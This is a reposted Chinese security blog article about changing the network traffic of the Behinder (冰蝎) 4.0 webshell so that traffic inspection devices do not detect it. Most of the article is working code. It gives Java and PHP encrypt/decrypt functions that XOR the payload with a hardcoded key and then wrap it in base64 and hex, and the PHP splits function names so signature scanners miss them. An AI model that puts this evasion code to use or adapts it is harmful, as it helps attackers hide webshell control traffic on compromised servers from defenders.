---
title: 冰蝎流量免杀初探
url: https://buaq.net/go-139513.html
source: unSafe.sh - 不安全
date: 2022-12-11
fetch_date: 2025-10-04T01:10:19.534643
---

# 冰蝎流量免杀初探

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/685a1d9cb0e7fc2a9d22e1a136228c51.jpg)

冰蝎流量免杀初探

0x01 前言冰蝎4.0发布以后，可以自定义传输协议了，也就是我们能对流量进行改造，本文依据rebeyond大佬文章对冰蝎流量进行改造，记录一下踩过的坑。htt
*2022-12-10 23:22:0
Author: [xz.aliyun.com(查看原文)](/jump-139513.htm)
阅读量:36
收藏*

---

## 0x01 前言

冰蝎4.0发布以后，可以自定义传输协议了，也就是我们能对流量进行改造，本文依据rebeyond大佬文章对冰蝎流量进行改造，记录一下踩过的坑。

<https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A>

冰蝎传输协议模块

分为本地和远程，其中本地模块只能用java进行编写，远程模块根据webshell的语言类型进行编写，比如java、php、asp，全部编写好后要生成服务端，也就是生成我们自己的webshell，用生成后的webshell进行连接。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221210230618-33234362-789c-1.png)

借用大佬的图说明一下加解密流程

![](https://xzfile.aliyuncs.com/media/upload/picture/20221210230624-36542b64-789c-1.png)

整体流量加解密流程为先对payload进行base64，再转成十六进制，具体函数往下看。

## 0x02 加解密过程

### 1、本地加密函数

```
private byte[] Encrypt(byte[] data) throws Exception{
        //传入一个字节数组data，对data依据key进行按位异或
        String key="e45e329feb5d925b";
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) ((data[i]) ^ (key.getBytes()[i + 1 & 15]));
        }
        //先转换成base64，利用反射调用base64编码
        byte[] encrypted = null;
        Class baseCls;
        try
        {
            baseCls=Class.forName("java.util.Base64");
            Object Encoder=baseCls.getMethod("getEncoder", null).invoke(baseCls, null);
            encrypted= (byte[]) Encoder.getClass().getMethod(
                    "encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error)
        {
            baseCls=Class.forName("sun.misc.BASE64Encoder");
            Object Encoder=baseCls.newInstance();
            String result=(String) Encoder.getClass().getMethod(
                    "encode",new Class[]{byte[].class}).invoke(Encoder, new Object[]{data});
            result=result.replace("\n", "").replace("\r", "");
            encrypted=result.getBytes();
        }

        //再改写成hex，利用DatatypeConverter类的printHexBinary()方法进行转换
        Object obj = null;
        try{
            Class clazz = Class.forName("javax.xml.bind.DatatypeConverter");
            /*
            这里返回了一个Object类型，虽然encrypted定义的是字节数组，
            但是这里传进去的时候不知道为什么报的是Object，所以定义一个Object来接收。
            这里用printHexBinary()把base64字符串转成16进制字符串，
            printHexBinary()接收一个byte数组，
            printHexBinary()是一个静态方法，invoke第一个参数可以传入null，
             */
            obj = clazz.getDeclaredMethod("printHexBinary",new Class[]{byte[].class}).invoke(null,encrypted);
        }catch (Throwable error){
            System.out.println(error);
        }
        //因为要求返回字节数组，所以这里先把Object转成字符串，再转成字节数组，好像不能直接由object转byte
        byte[] encrypted_hex = obj.toString().toLowerCase().getBytes();
        return encrypted_hex;
    }
```

### 2、本地解密函数

```
private byte[] Decrypt(byte[] data) throws Exception
    {   //从十六进制转回base64
        String decrypted_hex = new String(data);
        byte[] decrypted_base = null;
        try{
            Class clazz = Class.forName("javax.xml.bind.DatatypeConverter");
            /*
            这里用parseHexBinary()把16进制字符串转回base64字符串
            parseHexBinary()接收16进制字符串，转回正常字符串
            parseHexBinary()是静态方法，invoke第一个参数可以为空
             */
            decrypted_base = (byte[])clazz.getDeclaredMethod("parseHexBinary",String.class).invoke(null,decrypted_hex);
        }catch (Throwable error){
            System.out.println(error);
        }

        //从base64转回正常字符串

        byte[] decodebs;
        Class baseCls ;
        try{
            baseCls=Class.forName("java.util.Base64");
            Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
            decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{decrypted_base});
        }
        catch (Throwable e)
        {
            baseCls = Class.forName("sun.misc.BASE64Decoder");
            Object Decoder=baseCls.newInstance();
            decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(decrypted_base)});

        }
        String key="e45e329feb5d925b";
        for (int i = 0; i < decodebs.length; i++) {
            decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));
        }
        return decodebs;
    }
```

可以先看一下本地加密的效果

![](https://xzfile.aliyuncs.com/media/upload/picture/20221210232052-3c2d973a-789e-1.png)

至此，本地加解密函数完成，下一步我们研究webshell怎么写。因为本文研究流量免杀，webshell的免杀在此处不做讨论。

### 3、远程加密函数

```
function Encrypt($data)
{
    $key="e45e329feb5d925b";
    for($i=0;$i<strlen($data);$i++) {
        $data[$i] = $data[$i]^$key[$i+1&15];
    }
    $bs="base64_"."encode";
    $after=$bs($data."");

    return bin2hex($after);//base64后转16进制
}
```

### 4、解密函数

```
function Decrypt($data)
{
    $key="e45e329feb5d925b";
    $bs="base64_"."decode";
    $after=$bs(pack('H*',$data)."");//先解出16进制，再base64解码
    for($i=0;$i<strlen($after);$i++) {
        $after[$i] = $after[$i]^$key[$i+1&15];
    }

    return $after;
}
```

## 0x03 效果

先生成服务端，生成我们自己的webshell

![](https://xzfile.aliyuncs.com/media/upload/picture/20221210230651-46cb9680-789c-1.png)

连接webshell

![](https://xzfile.aliyuncs.com/media/upload/picture/20221210230725-5ae68422-789c-1.png)

用burp抓包看一下流量

![](https://xzfile.aliyuncs.com/media/upload/picture/20221210230814-780f9c3c-789c-1.png)

## 0x03 总结

本次加解密流程为先base64，再转成16进制字符串。先转成base64主要是为了保护原始payload，以免在从十六进制转回原payload的过程中发生递归解析，将原payload中的十六进制字符串也一并解析了。

本文仅针对冰蝎流量改造进行初步探讨，熟悉一下整个流程，真的要绕流量设备，估计还需要其他的技巧。

文章来源: https://xz.aliyun.com/t/11942
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)